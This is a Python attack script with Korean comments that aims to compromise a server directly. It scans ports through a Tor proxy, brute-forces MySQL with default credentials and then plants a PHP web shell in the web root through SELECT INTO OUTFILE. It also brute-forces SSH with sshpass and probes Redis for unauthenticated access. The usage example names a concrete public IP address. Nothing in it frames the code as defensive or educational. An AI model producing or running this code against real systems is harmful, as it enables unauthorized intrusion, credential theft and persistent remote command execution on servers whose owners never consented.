#!/usr/bin/env python3
"""
직접 서버 공격
웹 애플리케이션 우회하고 서버 자체 공격
"""

import socket
import sys
import subprocess
import time

def port_scan(target_ip):
    """포트 스캔"""
    print(f"\n[1] 포트 스캔: {target_ip}")
    print("="*60)

    common_ports = [
        (21, 'FTP'),
        (22, 'SSH'),
        (23, 'Telnet'),
        (25, 'SMTP'),
        (80, 'HTTP'),
        (443, 'HTTPS'),
        (3306, 'MySQL'),
        (5432, 'PostgreSQL'),
        (6379, 'Redis'),
        (8080, 'HTTP-Alt'),
        (27017, 'MongoDB'),
    ]

    open_ports = []

    print(f"[*] 스캔 중...\n")

    for port, service in common_ports:
        try:
            # Tor SOCKS5 프록시 통해 연결
            cmd = f"nc -z -w 2 -x 127.0.0.1:9050 {target_ip} {port}"
            result = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)

            if result.returncode == 0:
                print(f"[+] {port:5d}/tcp {service:15s} OPEN")
                open_ports.append((port, service))

        except:
            pass

    print(f"\n[+] 열린 포트: {len(open_ports)}개")
    return open_ports

def mysql_attack(target_ip):
    """MySQL 직접 공격"""
    print(f"\n[2] MySQL 직접 공격")
    print("="*60)

    # 기본 자격증명
    creds = [
        ('root', ''),
        ('root', 'root'),
        ('root', 'password'),
        ('root', 'admin'),
        ('root', 'toor'),
        ('admin', 'admin'),
        ('admin', 'password'),
    ]

    print(f"[*] {len(creds)}개 자격증명 시도\n")

    try:
        import pymysql

        for user, password in creds:
            try:
                print(f"[*] {user}:{password if password else '(empty)'}")

                conn = pymysql.connect(
                    host=target_ip,
                    port=3306,
                    user=user,
                    password=password,
                    connect_timeout=5
                )

                print(f"\n[+] ✅✅✅ MySQL 접속 성공!")
                print(f"    사용자: {user}")
                print(f"    비밀번호: {password if password else '(empty)'}\n")

                cursor = conn.cursor()

                # 데이터베이스 목록
                cursor.execute("SHOW DATABASES")
                dbs = cursor.fetchall()

                print(f"[+] 데이터베이스 목록:")
                for db in dbs:
                    print(f"    - {db[0]}")

                # 웹쉘 생성 시도
                print(f"\n[*] 웹쉘 생성 시도...")

                webshell = '<?php system($_GET["x"]); ?>'

                try:
                    sql = f"SELECT '{webshell}' INTO OUTFILE '/var/www/html/mysql_shell.php'"
                    cursor.execute(sql)
                    conn.commit()

                    print(f"[+] ✅ 웹쉘 생성 성공!")
                    print(f"    http://{target_ip}/mysql_shell.php?x=id")

                except Exception as e:
                    print(f"[-] 웹쉘 생성 실패: {str(e)[:80]}")

                    # 다른 경로 시도
                    paths = [
                        '/tmp/mysql_shell.php',
                        '/var/tmp/mysql_shell.php',
                    ]

                    for path in paths:
                        try:
                            sql = f"SELECT '{webshell}' INTO OUTFILE '{path}'"
                            cursor.execute(sql)
                            print(f"[+] 웹쉘 생성: {path}")
                        except:
                            pass

                cursor.close()
                conn.close()

                return (user, password)

            except pymysql.Error as e:
                pass

    except ImportError:
        print(f"[-] pymysql 없음")
        print(f"[*] 설치: pip3 install pymysql")

    print(f"\n[-] MySQL 접속 실패")
    return None

def ssh_attack(target_ip):
    """SSH 직접 공격"""
    print(f"\n[3] SSH 직접 공격")
    print("="*60)

    users = ['alice', 'admin', 'ubuntu', 'ec2-user', 'root']
    passwords = ['alice2024', 'admin', 'password', '123456']

    print(f"[*] 브루트포스: {len(users)} users × {len(passwords)} passwords\n")

    for user in users:
        for password in passwords:
            try:
                # sshpass로 비밀번호 입력
                cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@{target_ip} 'whoami' 2>/dev/null"

                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)

                if result.returncode == 0:
                    print(f"[+] ✅✅✅ SSH 성공!")
                    print(f"    사용자: {user}")
                    print(f"    비밀번호: {password}")
                    print(f"\n[*] 접속:")
                    print(f"    sshpass -p '{password}' ssh {user}@{target_ip}\n")

                    return (user, password)

            except:
                pass

            print(f"[-] {user}:{password}", end='\r')

    print(f"\n[-] SSH 브루트포스 실패")
    return None

def service_exploit(target_ip, open_ports):
    """서비스별 Exploit"""
    print(f"\n[4] 서비스 Exploit")
    print("="*60)

    for port, service in open_ports:
        print(f"\n[*] {service} ({port})")

        if service == 'Redis':
            # Redis 무인증 접근
            print(f"    [*] Redis 무인증 테스트...")
            try:
                cmd = f"echo 'INFO' | nc -w 2 {target_ip} {port}"
                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)

                if b'redis_version' in result.stdout:
                    print(f"    [+] ✅ Redis 무인증 접근 가능!")
                    print(f"    [*] Exploit 가능: Cron Job 주입")

            except:
                pass

        elif service == 'MongoDB':
            # MongoDB 무인증
            print(f"    [*] MongoDB 무인증 테스트...")

def main():
    if len(sys.argv) < 2:
        print("사용법: python3 103_direct_server_attack.py <TARGET_IP>")
        print("예시: python3 103_direct_server_attack.py 43.201.154.142")
        sys.exit(1)

    target_ip = sys.argv[1]

    print("="*60)
    print("직접 서버 공격")
    print("웹 애플리케이션 우회")
    print("="*60)
    print(f"타겟: {target_ip}\n")

    # 1. 포트 스캔
    open_ports = port_scan(target_ip)

    # 2. MySQL 공격
    mysql_result = mysql_attack(target_ip)

    if mysql_result:
        print(f"\n[+] ✅✅✅ MySQL 탈취 성공!")
        return

    # 3. SSH 공격
    ssh_result = ssh_attack(target_ip)

    if ssh_result:
        print(f"\n[+] ✅✅✅ SSH 탈취 성공!")
        return

    # 4. 서비스 Exploit
    service_exploit(target_ip, open_ports)

    print(f"\n{'='*60}")
    print(f"[+] 직접 공격 완료!")
    print(f"{'='*60}")

if __name__ == "__main__":
    main()
